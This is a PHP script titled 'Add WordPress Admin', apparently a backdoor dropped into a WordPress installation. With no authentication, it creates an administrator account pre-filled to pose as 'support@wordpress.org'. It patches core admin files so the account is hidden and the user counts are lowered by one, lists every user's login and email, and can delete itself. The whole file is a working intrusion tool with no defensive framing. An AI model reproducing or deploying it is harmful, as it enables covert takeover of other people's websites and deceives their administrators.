<?php
header("Content-Type: text/html;charset=utf-8");
ini_set('max_execution_time', '0');
error_reporting(E_ALL);
ini_set('display_errors', '1');
require __DIR__ . '/wp-load.php';
$con = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
if(mysqli_connect_errno($con)){die("Failed to connect to MySQL: ".mysqli_connect_error());}
mysqli_query($con, "SET NAMES ".DB_CHARSET);
$notice = '';
$user_name = isset($_POST['user_name']) ? $_POST['user_name'] : '';
$pwd = isset($_POST['pwd']) ? $_POST['pwd'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';
    if($_POST['action'] == 'del'){
        $file_path = __DIR__.'/wp-add.php';
        if(file_exists($file_path)){
            unlink($file_path);
        }
    }
if($user_name != '' && $pwd != '' && $email != ''){    
    if(!function_exists('wp_hash_password')){
        function wp_hash_password($password){
             global $wp_hasher;
            if(empty($wp_hasher)){
                require_once ABSPATH . WPINC . '/class-phpass.php';
                 $wp_hasher = new PasswordHash( 8, true );
            }
            return $wp_hasher->HashPassword( trim( $password ) );
         }
     }

     $user_id = 0;
    $check = mysqli_query($con, "SELECT * FROM `".$table_prefix."users` WHERE `user_login` = '".addslashes($user_name)."' OR `user_email` = '".addslashes($email)."'");
    if(mysqli_num_rows($check) > 0){
         $notice = '该用户名或邮箱已被使用过。';
        $row = mysqli_fetch_array($check, MYSQLI_ASSOC);
         $user_id = $row['ID'];
    }else{
         $hash = wp_hash_password($pwd);
        mysqli_query($con, "INSERT INTO `".$table_prefix."users`  (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_registered`, `user_status`, `display_name`) VALUES ('".addslashes($user_name)."', '".addslashes($hash)."', '".addslashes($user_name)."', '".addslashes($email)."', '2020-06-14 00:00:00', 0, '".addslashes($user_name)."')");
        $user_id = mysqli_insert_id($con);
         if($user_id > 0){
             $code = 'a:1:{s:13:"administrator";b:1;}';
             mysqli_query($con, "INSERT INTO `".$table_prefix."usermeta`  (`user_id`, `meta_key`, `meta_value`) VALUES (".$user_id.", 'nickname', '".addslashes($user_name)."'), (".$user_id.", 'first_name', ''), (".$user_id.", 'last_name', ''), (".$user_id.", 'description', ''), (".$user_id.", 'rich_editing', 'true'), (".$user_id.", 'syntax_highlighting', 'true'), (".$user_id.", 'comment_shortcuts', 'false'), (".$user_id.", 'admin_color', 'fresh'), (".$user_id.", 'use_ssl', 0), (".$user_id.", 'show_admin_bar_front', 'true'), (".$user_id.", 'locale', ''), (".$user_id.", '".$table_prefix."capabilities', '".$code."'), (".$user_id.", '".$table_prefix."user_level', 10)");
             if(mysqli_insert_id($con) > 0){
                 $notice = '用户添加成功';
             }else{
                $notice = '用户添加失败';
            }
        }else{
            $notice = '用户添加失败';
         }
    }

    if($user_id > 0){
        $code = '<style>#user-'.$user_id.'{display:none;}</style>';
        $path = ABSPATH.'wp-admin/admin-header.php';
         if(file_exists($path)){
            $temp = file_get_contents($path);
             if(strstr($temp, $code)){
                $notice .= ' Style 代码已添加过。';
            }else{
                if(strstr($temp, '<div id="wpbody')){
                    $fp = fopen($path, "wb");
                    fwrite($fp, str_replace('<div id="wpbody', $code.'<div id="wpbody', $temp)); 
                   fclose($fp);
                    $notice .= ' Style 代码添加成功。';
                }else{
                    $notice .= ' Style 代码添加失败。';
                }
            }
        }else{
            $notice .= ' Style 文件查找失败。';
        }

         $path = ABSPATH.'wp-admin/includes/class-wp-users-list-table.php';
         if(file_exists($path)){
             $temp = file_get_contents($path);
            $status = 0;
            if(strstr($temp, 'number_format_i18n( $total_users-1') && (strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1') || strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')) ){
                $notice .= ' 隐藏数字 代码已添加过。';
            }else{
                 if(!strstr($temp, 'number_format_i18n( $total_users-1')){
                    $temp = str_replace('number_format_i18n( $total_users', 'number_format_i18n( $total_users-1', $temp);
                }
                if(!strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')){
                     $temp = str_replace('number_format_i18n( $avail_roles[$this_role]', 'number_format_i18n( $avail_roles[$this_role]-1', $temp);
                }
                if(!strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1')){
                    $temp = str_replace('number_format_i18n( $avail_roles[ $this_role ]', 'number_format_i18n( $avail_roles[ $this_role ]-1', $temp);
                }
               $fp = fopen($path, "wb");
               fwrite($fp, $temp);
               fclose($fp);
                 $notice .= ' 隐藏数字 代码添加成功。';                
             }
         }else{
             $notice .= ' 隐藏数字 文件查找失败。';
        }
   }

}


$sql = mysqli_query($con , "SELECT * FROM `".$table_prefix."users`");
$total = mysqli_num_rows($sql);
if($total > 0){
    $list = '';
    while($row = mysqli_fetch_array($sql, MYSQLI_ASSOC)){
        $list .= '<tr><td>'.$row['ID'].'</td><td>'.$row['user_login'].'</td><td>'.$row['user_email'].'</td><td>'.$row['user_nicename'].'</td><td>'.$row['user_registered'].'</td></tr>';
    }
}
mysqli_close($con);
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<title>Add WordPress Admin</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<meta name="renderer" content="webkit|ie-comp|ie-stand">
<style>body{background-color:#F2F2F2;}.notice{background-color:#FFFF00;color:#0074BF;padding-left:10px;}.table{border-collapse:collapse;border-spacing:0;width:90%;margin:30px auto;}
.table td{word-break:break-all;max-width:300px;background-color:#FFF;}
.table th, .table td{border: 1px solid #ddd;padding:8px;}
.table tbody > tr:nth-child(2n+1) > td, .table tbody > tr:nth-child(2n+1) > th {background-color:#f9f9f9;}</style>
<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
</head>
<body>
<table class="table">
  <tr>
    <td colspan="5" align="left"><div class="notice"><?php echo $notice;?></div></td>
  </tr>
  <tr>
    <td colspan="5" align="left">【 添加新管理员 】</td>
  </tr>
  <tr>
    <td colspan="5" align="left"><form action="" method="post" name="form">用户名：<input type="text" value="Support" name="user_name"> 密码：<input type="text" value="vFELLmUMgJJdQW4S" name="pwd"> 邮箱：<input type="text" value="support@wordpress.org" name="email"> <input type="submit"></form></td>
  </tr>
  <tr>
    <td colspan="5" align="left"><form action="" method="post" name="form"><input type='hidden' name="action" value='del'><input type="submit" value="删除文件"></form></td>
  </tr>
  <tr>
    <td colspan="5" align="left">【 用户列表：<?php echo $total;?>位 】</td>
  </tr>
  <?php if($total > 0){?>
  <tr>
    <td>ID</td>
    <td>用户名</td>
    <td>邮箱</td>
    <td>昵称</td>
    <td>注册时间</td>
  </tr>
  <?php echo $list;}?>
</table>
</body>
</html>
